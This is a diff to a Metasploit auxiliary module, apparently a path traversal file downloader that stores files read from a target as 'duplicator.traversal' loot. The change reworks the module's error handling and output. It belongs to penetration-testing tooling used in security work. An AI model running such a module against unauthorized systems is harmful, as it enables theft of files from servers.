@@ -57,24 +57,22 @@ class MetasploitModule < Msf::Auxiliary
         }
     })
 
-    if res && res.code == 200 && res.body.length > 0
+    fail_with Failure::Unreachable, 'Connection failed' unless res
+    fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200
+    fail_with Failure::NotVulnerable, 'Nothing was downloaded. You can try to change the DEPTH parameter' if res.body.length == 0
 
-      print_status('Downloading file...')
-      print_line("\n#{res.body}\n")
+    print_status('Downloading file...')
+    print_line("\n#{res.body}\n")
 
-      fname = datastore['FILEPATH']
+    fname = datastore['FILEPATH']
 
-      path = store_loot(
+    path = store_loot(
         'duplicator.traversal',
         'text/plain',
         ip,
         res.body,
         fname
       )
-
-      print_good("File saved in: #{path}")
-    else
-      print_error("Nothing was downloaded. You can try to change the DEPTH parameter.")
+    print_good("File saved in: #{path}")
     end
   end
-end
